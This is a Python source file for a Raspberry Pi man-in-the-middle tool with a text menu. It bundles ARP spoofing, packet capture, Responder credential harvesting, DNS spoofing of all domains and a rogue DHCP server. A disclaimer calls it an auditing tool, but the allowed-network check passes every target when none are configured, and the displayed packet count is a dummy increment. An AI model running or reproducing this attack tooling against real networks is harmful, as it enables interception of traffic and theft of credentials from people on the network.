#!/usr/bin/env python3
import os
import sys
import subprocess
import time
import logging
from datetime import datetime
import json
import netifaces
import requests
import readline
import re
import urllib.request
import shutil
import socket
from concurrent.futures import ThreadPoolExecutor
import curses
import threading
import queue

# ASCII Art
ASCII_ART = r"""
  __  __ ___ _____ __  __    ___ _   _ _  _______ ____  
 |  \/  |_ _|_   _|  \/  |  |_ _| \ | | |/ / ____|  _ \ 
 | |\/| || |  | | | |\/| |   | ||  \| | ' /|  _| | |_) |
 | |  | || |  | | | |  | |   | || |\  | . \| |___|  _ < 
 |_|  |_|___| |_| |_|  |_|  |___|_| \_|_|\_\_____|_| \_\
 
 Raspberry Pi MITM Network Auditing Tool
"""

# Configuration
CONFIG_FILE = "/etc/mitm_tool/config.json"
LOG_FILE = "/var/log/mitm_tool.log"
DATA_DIR = "/var/lib/mitm_tool/captures"
REMOTE_UPLOAD_URL = "https://your-remote-endpoint.com/api/upload"
MAC_VENDOR_DB_URL = "https://standards-oui.ieee.org/oui/oui.txt"
MAC_VENDOR_CACHE = "/tmp/mac_vendors.txt"

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

# --- Helper Functions for ARP Scan Output ---
def parse_arp_scan(output):
    """Parse ARP scan output into a list of device dicts."""
    devices = []
    for line in output.splitlines():
        m = re.match(r"(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f:]{17})\s+(.*)", line, re.I)
        if m:
            ip, mac, vendor = m.groups()
            devices.append({'ip': ip, 'mac': mac, 'vendor': vendor})
    return devices

def print_devices(devices):
    """Print devices in a clean table."""
    print("\n{:<15} {:<17} {}".format("IP", "MAC", "Vendor"))
    print("-" * 50)
    for d in devices:
        print("{:<15} {:<17} {}".format(d['ip'], d['mac'], d['vendor']))
    print()

class MITMTool:
    def __init__(self):
        self.load_config()
        self.check_safety()
        self.setup_environment()
        self.interfaces = {}
        self.targets = []
        self.capture_processes = {}
        self.mac_vendors = {}
        self.load_mac_vendors()
        self.packet_count = 0
        self.active_attacks = set()
        self.status_queue = queue.Queue()
        self.status_thread = threading.Thread(target=self.status_updater, daemon=True)
        self.status_thread.start()

    def status_updater(self):
        """Background thread to update packet count and active attacks"""
        while True:
            try:
                if 'tcpdump' in self.capture_processes:
                    self.packet_count += 10  # Dummy increment
                else:
                    self.packet_count = 0
                time.sleep(5)
            except Exception:
                time.sleep(5)

    def load_mac_vendors(self):
        """Load MAC vendor database for device identification"""
        try:
            if not os.path.exists(MAC_VENDOR_CACHE) or (time.time() - os.path.getmtime(MAC_VENDOR_CACHE)) > 2592000:
                logger.info("Downloading MAC vendor database...")
                urllib.request.urlretrieve(MAC_VENDOR_DB_URL, MAC_VENDOR_CACHE + ".new")
                shutil.move(MAC_VENDOR_CACHE + ".new", MAC_VENDOR_CACHE)

            with open(MAC_VENDOR_CACHE, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    if "(base 16)" in line:
                        parts = line.split("(base 16)")
                        mac_prefix = parts[0].strip().replace('-', ':').upper()
                        vendor = parts[1].strip()
                        self.mac_vendors[mac_prefix] = vendor
            logger.info(f"Loaded {len(self.mac_vendors)} MAC vendors")
        except Exception as e:
            logger.error(f"Failed to load MAC vendors: {str(e)}")

    def get_device_type(self, mac):
        if not mac or not self.mac_vendors:
            return "Unknown"
        mac = mac.upper().replace('-', ':')
        if len(mac) < 8:
            return "Unknown"
        oui = mac[:8]
        if oui in self.mac_vendors:
            vendor = self.mac_vendors[oui]
            if "Apple" in vendor:
                return "Apple"
            elif "Samsung" in vendor:
                return "Samsung"
            elif "Amazon" in vendor:
                return "Amazon"
            elif "Google" in vendor:
                return "Google"
            elif "Raspberry" in vendor:
                return "Raspberry Pi"
            elif "TP-Link" in vendor:
                return "TP-Link"
            elif "Xiaomi" in vendor:
                return "Xiaomi"
            elif "Dell" in vendor:
                return "Dell"
            elif "LG" in vendor:
                return "LG"
            elif "Sony" in vendor:
                return "Sony"
            elif "Microsoft" in vendor:
                return "Microsoft"
            return vendor
        return "Unknown"

    def get_device_name(self, ip, mac):
        dhcp_name = self.get_dhcp_name(mac)
        if dhcp_name and dhcp_name.lower() not in ['unknown', 'localhost', 'android']:
            return dhcp_name
        netbios_name = self.get_netbios_name(ip)
        if netbios_name:
            return netbios_name
        mdns_name = self.get_mdns_name(ip)
        if mdns_name:
            return mdns_name
        llmnr_name = self.get_llmnr_name(ip)
        if llmnr_name:
            return llmnr_name
        return f"{self.get_device_type(mac)} Device"

    def get_dhcp_name(self, mac):
        try:
            with open('/var/lib/misc/dnsmasq.leases', 'r') as f:
                for line in f:
                    parts = line.strip().split()
                    if len(parts) >= 4 and parts[1].lower() == mac.lower():
                        return parts[3]
        except:
            pass
        return None

    def get_netbios_name(self, ip):
        try:
            result = subprocess.run(
                ["nmblookup", "-A", ip],
                capture_output=True, text=True, timeout=2
            )
            for line in result.stdout.split('\n'):
                if "<00>" in line and "UNIQUE" in line:
                    return line.split()[0]
        except:
            pass
        return None

    def get_mdns_name(self, ip):
        try:
            result = subprocess.run(
                ["avahi-resolve", "-a", ip],
                capture_output=True, text=True, timeout=2
            )
            if result.returncode == 0:
                name = result.stdout.split()[1]
                if name.endswith('.local'):
                    return name.replace('.local', '')
        except:
            pass
        return None

    def get_llmnr_name(self, ip):
        try:
            result = subprocess.run(
                ["nmblookup", "-A", ip],
                capture_output=True, text=True, timeout=2
            )
            for line in result.stdout.split('\n'):
                if "<20>" in line:
                    return line.split()[0]
        except:
            pass
        return None

    def enhance_device_info(self, device):
        ip = device.get('ip')
        mac = device.get('mac')
        if not ip or not mac:
            return device
        device['name'] = self.get_device_name(ip, mac)
        device['manufacturer'] = self.get_device_type(mac)
        device['os'] = self.guess_os(ip, mac)
        return device

    def guess_os(self, ip, mac):
        vendor = self.get_device_type(mac).lower()
        if 'apple' in vendor:
            return 'macOS/iOS'
        elif 'android' in vendor or 'google' in vendor:
            return 'Android'
        elif 'microsoft' in vendor:
            return 'Windows'
        elif 'linux' in vendor:
            return 'Linux'
        try:
            result = subprocess.run(
                ["nmap", "-O", "--osscan-limit", ip],
                capture_output=True, text=True, timeout=5
            )
            if "OS details:" in result.stdout:
                return result.stdout.split("OS details:")[1].split('\n')[0].strip()
        except:
            pass
        return 'Unknown'

    def load_config(self):
        try:
            with open(CONFIG_FILE) as f:
                self.config = json.load(f)
            logger.info("Configuration loaded successfully")
        except (FileNotFoundError, json.JSONDecodeError):
            self.config = {
                "remote_upload": False,
                "auto_start": False,
                "allowed_networks": [],
                "legal_disclaimer_accepted": False
            }
            logger.warning("Using default configuration")

    def check_safety(self):
        disclaimer = """
        WARNING: This tool is for authorized security auditing and penetration testing only.
        Unauthorized use is illegal and unethical. By using this tool, you agree that:
        
        1. You have explicit permission to test the network you're targeting
        2. You understand the legal implications of network monitoring
        3. You will not use this tool for malicious purposes
        
        The developers assume no liability for misuse of this software.
        """
        print(disclaimer)
        if not self.config.get("legal_disclaimer_accepted", False):
            response = input("Do you accept these terms? (yes/no): ").strip().lower()
            if response != "yes":
                print("Exiting...")
                sys.exit(0)
            self.config["legal_disclaimer_accepted"] = True
            self.save_config()

    def save_config(self):
        os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
        with open(CONFIG_FILE, 'w') as f:
            json.dump(self.config, f, indent=4)

    def setup_environment(self):
        os.makedirs(DATA_DIR, exist_ok=True)
        required_tools = [
            'arpspoof', 'dsniff', 'nmap', 'tcpdump', 
            'bettercap', 'responder', 'tailscale', 'iwlist',
            'brctl', 'ifconfig', 'arp', 'nmblookup', 'avahi-resolve',
            'dnsmasq'
        ]
        missing_tools = []
        for tool in required_tools:
            if not self.check_tool_installed(tool):
                missing_tools.append(tool)
        if missing_tools:
            logger.error(f"Missing required tools: {', '.join(missing_tools)}")
            sys.exit(1)

    def check_tool_installed(self, tool):
        try:
            subprocess.run(["which", tool], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return True
        except subprocess.CalledProcessError:
            return False

    def detect_interfaces(self):
        self.interfaces = {}
        try:
            interfaces = netifaces.interfaces()
            for iface in interfaces:
                if iface.startswith('eth') or iface.startswith('en') or iface.startswith('wlan'):
                    addrs = netifaces.ifaddresses(iface)
                    if netifaces.AF_INET in addrs:
                        ip_info = addrs[netifaces.AF_INET][0]
                        self.interfaces[iface] = {
                            'ip': ip_info.get('addr', ''),
                            'netmask': ip_info.get('netmask', ''),
                            'mac': addrs[netifaces.AF_LINK][0]['addr'] if netifaces.AF_LINK in addrs else '',
                            'type': 'wifi' if iface.startswith('wlan') else 'ethernet'
                        }
            logger.info(f"Detected interfaces: {json.dumps(self.interfaces, indent=2)}")
            return len(self.interfaces) >= 1
        except Exception as e:
            logger.error(f"Error detecting interfaces: {str(e)}")
            return False

    def setup_bridge(self):
        ethernet_ifaces = [iface for iface in self.interfaces if self.interfaces[iface]['type'] == 'ethernet']
        if len(ethernet_ifaces) < 2:
            logger.error("Need at least two Ethernet interfaces to create a bridge")
            return False
        iface1, iface2 = ethernet_ifaces[:2]
        try:
            subprocess.run(["sudo", "ifconfig", iface1, "0.0.0.0"], check=True)
            subprocess.run(["sudo", "ifconfig", iface2, "0.0.0.0"], check=True)
            subprocess.run(["sudo", "brctl", "addbr", "mitm-bridge"], check=True)
            subprocess.run(["sudo", "brctl", "addif", "mitm-bridge", iface1], check=True)
            subprocess.run(["sudo", "brctl", "addif", "mitm-bridge", iface2], check=True)
            subprocess.run(["sudo", "ifconfig", "mitm-bridge", "up"], check=True)
            logger.info(f"Successfully bridged {iface1} and {iface2} via mitm-bridge")
            return True
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to create bridge: {str(e)}")
            return False

    def network_scan(self):
        """Perform network scan using arp-scan and nmap, with clean output and no hanging."""
        if not self.interfaces:
            logger.error("No interfaces detected")
            return

        interface = list(self.interfaces.keys())[0]
        try:
            logger.info("Running ARP scan...")
            arp_scan = subprocess.run(
                ["sudo", "arp-scan", "--interface", interface, "--localnet"],
                capture_output=True, text=True
            )
            arp_devices = parse_arp_scan(arp_scan.stdout)
            print_devices(arp_devices)

            # Only scan found hosts with Nmap
            ips = [d['ip'] for d in arp_devices]
            if ips:
                logger.info("Running Nmap scan on discovered hosts...")
                nmap_cmd = ["sudo", "nmap", "-sV", "-O", "-T4", "--max-retries", "2", "-F"] + ips
                nmap_scan = subprocess.run(
                    nmap_cmd,
                    capture_output=True, text=True, timeout=90
                )
                print(nmap_scan.stdout)
            else:
                logger.warning("No hosts found in ARP scan")

        except subprocess.TimeoutExpired:
            logger.error("Nmap scan timed out!")
        except Exception as e:
            logger.error(f"Scanning failed: {str(e)}")

    def get_subnet(self, interface):
        if interface not in self.interfaces:
            return None
        ip = self.interfaces[interface]['ip']
        netmask = self.interfaces[interface]['netmask']
        if not ip or not netmask:
            return None
        if netmask == "255.255.255.0":
            return ".".join(ip.split(".")[:3]) + ".0/24"
        return None

    def arp_spoof(self, target_ip, gateway_ip):
        if not self.check_target_safety(target_ip):
            logger.error(f"Target {target_ip} is not in allowed networks")
            return
        try:
            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
            cmd1 = ["sudo", "arpspoof", "-i", "mitm-bridge", "-t", target_ip, gateway_ip]
            cmd2 = ["sudo", "arpspoof", "-i", "mitm-bridge", "-t", gateway_ip, target_ip]
            self.capture_processes['arpspoof1'] = subprocess.Popen(cmd1)
            self.capture_processes['arpspoof2'] = subprocess.Popen(cmd2)
            self.active_attacks.add('ARP Spoofing')
            logger.info(f"ARP spoofing started between {target_ip} and {gateway_ip}")
            return True
        except Exception as e:
            logger.error(f"ARP spoofing failed: {str(e)}")
            return False

    def check_target_safety(self, target_ip):
        if not self.config.get("allowed_networks"):
            return True
        for network in self.config.get("allowed_networks", []):
            if target_ip.startswith(network):
                return True
        return False

    def start_packet_capture(self, interface="mitm-bridge", filename=None):
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{DATA_DIR}/capture_{timestamp}.pcap"
        try:
            cmd = [
                "sudo", "tcpdump", "-i", interface, 
                "-w", filename, "-s", "0", 
                "not port 22"
            ]
            self.capture_processes['tcpdump'] = subprocess.Popen(cmd)
            self.active_attacks.add('Packet Capture')
            logger.info(f"Packet capture started on {interface}, saving to {filename}")
            return True
        except Exception as e:
            logger.error(f"Packet capture failed: {str(e)}")
            return False

    def start_responder(self, interface="mitm-bridge"):
        try:
            cmd = [
                "sudo", "responder", "-I", interface,
                "-w", "-d", "--lm"
            ]
            self.capture_processes['responder'] = subprocess.Popen(cmd)
            self.active_attacks.add('Responder')
            logger.info(f"Responder started on {interface}")
            return True
        except Exception as e:
            logger.error(f"Failed to start Responder: {str(e)}")
            return False

    def start_bettercap(self, interface="mitm-bridge", script_path=None):
        try:
            cmd = ["sudo", "bettercap", "-iface", interface]
            if script_path:
                cmd.extend(["-caplet", script_path])
            self.capture_processes['bettercap'] = subprocess.Popen(cmd)
            self.active_attacks.add('Bettercap')
            logger.info(f"Bettercap started on {interface} with script {script_path}")
            return True
        except Exception as e:
            logger.error(f"Failed to start Bettercap: {str(e)}")
            return False

    def start_dns_spoof(self, interface="mitm-bridge", hosts_file="/etc/mitm_tool/dns_hosts"):
        caplet_content = f"""
set dns.spoof.domains *
set dns.spoof.address 192.168.1.1
dns.spoof on
"""
        caplet_path = "/tmp/dns_spoof.cap"
        try:
            with open(caplet_path, "w") as f:
                f.write(caplet_content)
            return self.start_bettercap(interface=interface, script_path=caplet_path)
        except Exception as e:
            logger.error(f"Failed to start DNS spoofing: {str(e)}")
            return False

    def start_rogue_dhcp(self, interface="mitm-bridge"):
        dhcp_conf = f"""
interface={interface}
dhcp-range=192.168.1.100,192.168.1.200,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
"""
        conf_path = "/tmp/rogue_dhcp.conf"
        try:
            with open(conf_path, "w") as f:
                f.write(dhcp_conf)
            cmd = ["sudo", "dnsmasq", "-C", conf_path, "-d"]
            self.capture_processes['rogue_dhcp'] = subprocess.Popen(cmd)
            self.active_attacks.add('Rogue DHCP')
            logger.info(f"Rogue DHCP server started on {interface}")
            return True
        except Exception as e:
            logger.error(f"Failed to start rogue DHCP server: {str(e)}")
            return False

    def stop_all_attacks(self):
        for name, proc in self.capture_processes.items():
            try:
                proc.terminate()
                proc.wait(timeout=5)
                logger.info(f"Stopped {name} process")
            except Exception:
                proc.kill()
                logger.info(f"Killed {name} process")
        self.capture_processes.clear()
        self.active_attacks.clear()
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"])
        logger.info("All attacks stopped and IP forwarding disabled")

    def show_status(self, stdscr):
        stdscr.clear()
        stdscr.border(0)
        stdscr.addstr(1, 2, "MITM Network Auditing Tool - Status", curses.A_BOLD)
        stdscr.addstr(3, 4, f"Active Attacks: {', '.join(self.active_attacks) if self.active_attacks else 'None'}")
        stdscr.addstr(4, 4, f"Packet Captured (approx.): {self.packet_count}")
        stdscr.addstr(5, 4, f"Detected Interfaces: {', '.join(self.interfaces.keys())}")
        stdscr.addstr(7, 4, "Press 'q' to return to menu")
        stdscr.refresh()

    def tui_main(self, stdscr):
        curses.curs_set(0)
        current_row = 0
        menu = [
            "Scan Network",
            "Start ARP Spoofing",
            "Start Packet Capture",
            "Start Responder (Credential Harvesting)",
            "Start DNS Spoofing",
            "Start Rogue DHCP Server",
            "Stop All Attacks",
            "Show Status",
            "Exit"
        ]

        def print_menu():
            stdscr.clear()
            stdscr.border(0)
            stdscr.addstr(1, 2, ASCII_ART, curses.color_pair(2))
            stdscr.addstr(10, 2, "Use arrow keys to navigate and Enter to select", curses.A_DIM)
            for idx, item in enumerate(menu):
                x = 4
                y = 12 + idx
                if idx == current_row:
                    stdscr.attron(curses.color_pair(1))
                    stdscr.addstr(y, x, item)
                    stdscr.attroff(curses.color_pair(1))
                else:
                    stdscr.addstr(y, x, item)
            stdscr.refresh()

        curses.init_pair(1, curses.COLOR_BLACK, curses.COLOR_CYAN)
        curses.init_pair(2, curses.COLOR_GREEN, curses.COLOR_BLACK)

        while True:
            print_menu()
            key = stdscr.getch()

            if key == curses.KEY_UP and current_row > 0:
                current_row -= 1
            elif key == curses.KEY_DOWN and current_row < len(menu) - 1:
                current_row += 1
            elif key in [curses.KEY_ENTER, 10, 13]:
                stdscr.clear()
                stdscr.refresh()
                if current_row == 0:
                    curses.endwin()
                    self.network_scan()
                    input("Network scan completed. Press Enter to continue.")
                    stdscr.refresh()
                elif current_row == 1:
                    stdscr.addstr(2, 2, "Enter target IP: ")
                    curses.echo()
                    target_ip = stdscr.getstr(2, 20, 15).decode()
                    stdscr.addstr(3, 2, "Enter gateway IP: ")
                    gateway_ip = stdscr.getstr(3, 20, 15).decode()
                    curses.noecho()
                    if self.arp_spoof(target_ip, gateway_ip):
                        stdscr.addstr(5, 2, "ARP spoofing started. Press any key to continue.")
                    else:
                        stdscr.addstr(5, 2, "Failed to start ARP spoofing. Press any key to continue.")
                    stdscr.getch()
                elif current_row == 2:
                    if self.start_packet_capture():
                        stdscr.addstr(2, 2, "Packet capture started. Press any key to continue.")
                    else:
                        stdscr.addstr(2, 2, "Failed to start packet capture. Press any key to continue.")
                    stdscr.getch()
                elif current_row == 3:
                    if self.start_responder():
                        stdscr.addstr(2, 2, "Responder started. Press any key to continue.")
                    else:
                        stdscr.addstr(2, 2, "Failed to start Responder. Press any key to continue.")
                    stdscr.getch()
                elif current_row == 4:
                    if self.start_dns_spoof():
                        stdscr.addstr(2, 2, "DNS spoofing started. Press any key to continue.")
                    else:
                        stdscr.addstr(2, 2, "Failed to start DNS spoofing. Press any key to continue.")
                    stdscr.getch()
                elif current_row == 5:
                    if self.start_rogue_dhcp():
                        stdscr.addstr(2, 2, "Rogue DHCP server started. Press any key to continue.")
                    else:
                        stdscr.addstr(2, 2, "Failed to start rogue DHCP server. Press any key to continue.")
                    stdscr.getch()
                elif current_row == 6:
                    self.stop_all_attacks()
                    stdscr.addstr(2, 2, "All attacks stopped. Press any key to continue.")
                    stdscr.getch()
                elif current_row == 7:
                    self.show_status(stdscr)
                    while True:
                        k = stdscr.getch()
                        if k == ord('q'):
                            break
                elif current_row == 8:
                    self.stop_all_attacks()
                    break

def main():
    tool = MITMTool()
    if not tool.detect_interfaces():
        print("No suitable network interfaces detected. Exiting.")
        sys.exit(1)
    curses.wrapper(tool.tui_main)

if __name__ == "__main__":
    main()
